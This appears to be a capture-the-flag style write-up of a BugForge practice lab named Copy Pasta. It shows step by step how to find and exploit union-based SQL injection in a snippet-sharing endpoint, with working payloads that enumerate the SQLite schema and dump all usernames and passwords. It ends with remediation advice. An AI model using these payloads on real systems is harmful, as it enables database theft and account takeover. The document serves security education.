---
layout: post
title:  "BugForge - Daily - Copy Pasta"
date:   2026-01-28 20:00
image:  /images/bug-forge/bugforge-logo.png
tags:   [sqli]
categories: [BugForge,daily,copy-pasta]
---

# Daily - Copy Pasta
><br/><b>Vulnerabilities Covered:</b>
<br/>
SQL Injection
<br/>
<br/>
<b>Summary:</b>
<br/>
The CopyPasta application's share functionality contains a SQL Injection vulnerability in the `/api/snippets/share/:id` endpoint, where the GUID parameter is directly concatenated into SQL queries without proper sanitization. By injecting SQL payloads into the share endpoint, an attacker can perform UNION-based SQL injection to enumerate the SQLite database structure, extract table names and column schemas, and ultimately dump sensitive data including all usernames and passwords from the users table, resulting in complete database compromise and potential account takeover.
<br/>
<br/>
<b>Reference:</b>
<br/>
<a href="https://app.bugforge.io/">Bugforge.io</a>
<br/>
<br/>

## Solution

### Step 1 - Application Analysis
We begin by analysing and mapping all features of the app. The core of the app is sharing code snippets with others.  
First page you land on after registraion is the Dashboard which displays "My Snippets".

![Dashboard](/images/bug-forge/daily/copy-pasta/sqli/dashboard-ui.png)

You can create a new snippet using the Create Snippet button that redirects to the `/create` page.

![Create Snippet](/images/bug-forge/daily/copy-pasta/sqli/create-snippet-ui.png)

There is a public page where you can view other people's snippets that they've marked as public. You can view, like and leave comments on these snippets.

![Public Snippets](/images/bug-forge/daily/copy-pasta/sqli/public-snippets.png)

Next is the profile page, which shows you Your Snippets in one tab and account settings in another. You can also edit your basic profile directly from the Profile page (which opens a modal to edit your profile), or you can click on the Account Settings tab that gives you functionality to update your Profile Information, Change your password and Delete your account.

We'll Start off by analysing the Snippet features before we get to the Profile feature.

---

### Step 2 - Analysiging Snippet Feature
First we'll create a new snippet, update the snippet, add a comment, like the snippet and delete the snippet to capture all the endpoints to see if there are any vulnerabilities.

Creating the Snippet I've tested for XSS seeing that you can make the snippet public and other user's can view the snippet. You might be able to trigger XSS and extract user sessions etc.

![XSS](/images/bug-forge/daily/copy-pasta/sqli/ui-xss-failed.png)

That didn't work so we moved on to Testing for any Idor vulnerabilities.

The last functionality left on the snippets feature is the share feature. 

![Share Request](/images/bug-forge/daily/copy-pasta/sqli/original-share-request.png)

Seeing that this passes a GUID as the query parameter we'll try SQLi 


![Share Request - SQLi](/images/bug-forge/daily/copy-pasta/sqli/sqli-share-request.png)

Testing the endpoint with a basic sqli command, we received a different snippet not ower own.


---

### Step 3 - Exploiting Sql Injection
Now that we've found that the share endpoint is vulnerable to SQLi we have to try and extract vulnerable data.

We'll determine how many columns are returned by using the `Order By` technique. 

When passing: `'ORDER BY 6 --` we still get data returned
```
GET /api/snippets/share/dc2a7e6e-a9fb-4ca1-8a2c-53939bd5287a'ORDER%20BY%206%20--
```

![Order By 6](/images/bug-forge/daily/copy-pasta/sqli/order-by-6.png)


When passing: `'ORDER BY 7 --` we no longer get data returned which indicates that the query has 6 columns.

```
GET /api/snippets/share/dc2a7e6e-a9fb-4ca1-8a2c-53939bd5287a'ORDER%20BY%207%20--
```

![Order By 7](/images/bug-forge/daily/copy-pasta/sqli/order-by-7.png)

Next we'll dump all the databases in the database, first we need to determine what version of SQL is running:

| SQL        | Command                              |
| ---------- | ------------------------------------ |
| MySQL      | SELECT @@version or SELECT version() |
| PostgreSQL | SELECT version()                     |
| MSSQL      | SELECT @@version                     |
| Oracle     | SELECT banner FROM v$version         |
| SQLite     | sqlite_version()                     |

```
'UNION SELECT 1,1,sqlite_version(),1,1,1 --
```

![Database Version](/images/bug-forge/daily/copy-pasta/sqli/sqli-database-version.png)

Next we'll dump the tables in the database:

```
'UNION SELECT 1,1,group_concat(name),1,1,1 FROM sqlite_master WHERE type='table'--
```
![Database table dump](/images/bug-forge/daily/copy-pasta/sqli/table-dump.png)

Next we'll get the columns of the `users` table:
```
'UNION SELECT 1,1,sql,1,1,1 FROM sqlite_master WHERE type='table' AND name='users'--
```

**Alternative:**

```
'UNION SELECT 1,1,GROUP_CONCAT(name),GROUP_CONCAT(sql),1,1 FROM sqlite_master WHERE type='table' AND name='users'--
```
![Users column dump](/images/bug-forge/daily/copy-pasta/sqli/users-columns-dump.png)

Next we'll extract the usernames and passwords of all users:

```
'UNION SELECT 1,1,GROUP_CONCAT(username),GROUP_CONCAT(password),1,1 FROM users --
```
![Flag](/images/bug-forge/daily/copy-pasta/sqli/flag.png)

---

### Impact
- Complete database compromise allowing extraction of all stored data
- Exposure of user credentials (usernames and passwords) enabling mass account takeover
- Potential for data manipulation or deletion through destructive SQL queries
- Bypass of all application-level access controls by directly querying the database
- Exposure of database schema revealing application architecture to attackers
- Potential for lateral movement if database credentials are reused elsewhere

---

### Vulnerability Classification
- **OWASP Top 10:** A03:2021 - Injection
- **Vulnerability Type:** SQL Injection (Union-Based)
- **Attack Surface:** Snippet share endpoint (`/api/snippets/share/:id`)
- **CWE:** CWE-89 - Improper Neutralization of Special Elements used in an SQL Command

---

### Root Cause
The backend directly concatenates user-supplied input from the share endpoint's GUID parameter into SQL queries without proper input validation or parameterization. The application fails to use prepared statements or parameterized queries, allowing attackers to inject arbitrary SQL commands. The SQLite database processes the malicious input as part of the query structure rather than treating it as data, enabling UNION-based injection to extract data from arbitrary tables.

---

### Remediation
- Use parameterized queries or prepared statements for all database interactions
- Implement input validation to reject unexpected characters in GUID parameters
- Apply the principle of least privilege to database accounts used by the application
- Hash and salt all stored passwords using strong algorithms (bcrypt, Argon2)
- Deploy a Web Application Firewall (WAF) to detect and block SQL injection attempts
- Implement database query logging and monitoring to detect anomalous query patterns
- Conduct regular security code reviews focusing on database interaction points
- Use an ORM with built-in SQL injection protections where appropriate

---
